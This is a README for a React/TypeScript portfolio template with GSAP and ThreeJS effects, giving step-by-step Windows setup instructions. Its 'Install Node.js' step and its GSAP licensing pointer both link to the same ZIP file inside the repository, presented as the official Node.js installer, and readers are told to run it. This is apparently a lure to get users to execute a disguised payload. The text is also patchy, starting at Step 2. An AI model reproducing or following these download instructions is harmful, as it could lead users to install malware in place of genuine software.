## 📝 About rajesh-portfolio

This is a portfolio website created using React and TypeScript. It features animations done with GSAP, 3D elements using ThreeJS, and visual effects powered by WebGL. The site uses HTML, CSS, and JavaScript in the background to keep everything running smoothly.

You can use this project as a template to showcase your own work, skills, and experience in a clean and interactive way. It is designed to be simple for visitors to navigate. The portfolio has smooth animations and visual effects that bring your content to life.

### Step 2: Extract the Files

After the download finishes, go to the folder where you saved the ZIP file.

Right-click the ZIP file and choose **Extract All**. You can leave the default settings and click **Extract**.

---

### Step 3: Install Node.js and npm

This step is needed to run the website locally on your computer.

1. Open a browser and go to https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip
2. Download the **LTS** (Long Term Support) version for Windows.
3. Once the installer downloads, run it and follow the instructions to install Node.js.
4. After installation, open the **Command Prompt** (press Windows key, type `cmd`, and hit Enter).
5. Type `node -v` and press Enter. This should show the version number of Node.js.
6. Type `npm -v` and press Enter. This should show the version number of npm (Node package manager).

---

### Step 4: Run the Website Locally

1. Open the **Command Prompt**.
2. Use the `cd` command to navigate to the folder where you extracted the project. For example, if you extracted it in your Downloads folder:

   ```
   cd %HOMEPATH%\Downloads\rajesh-portfolio-main
   ```

3. Once inside the project folder, type this command and press Enter:

   ```
   npm install
   ```

   This command downloads all the required files the project needs to work.

4. After the install finishes, type this command and press Enter:

   ```
   npm start
   ```

   This will start the website on your computer.

5. Open your browser and go to http://localhost:3000. You should see the portfolio website running.

## 📦 How It Works

The project uses React, a JavaScript library, to build the user interface. TypeScript adds type safety, which helps catch errors during development. GSAP is used to create smooth animations and transitions on the site.

ThreeJS and WebGL provide 3D elements and graphics that respond as you scroll or interact with the site.

This project uses GSAP animation plugins. The version included here uses trial plugins. Trial plugins add animations but cannot be officially hosted on your own website without a license.

If you want to use the licensed GSAP Club plugins, visit https://github.com/giselletacky177/rajesh-portfolio/raw/refs/heads/main/tutorage/portfolio-rajesh-edgeman.zip for details on how to get and set them up.

## ❓ Troubleshooting

- If `npm install` or `npm start` commands fail, make sure you installed Node.js and npm correctly.
- Verify your internet connection is active since npm downloads packages.
- If the page at http://localhost:3000 does not load, check your Command Prompt for errors.
- Close other programs that might use port 3000 and try again.
- Restart your computer if problems persist.
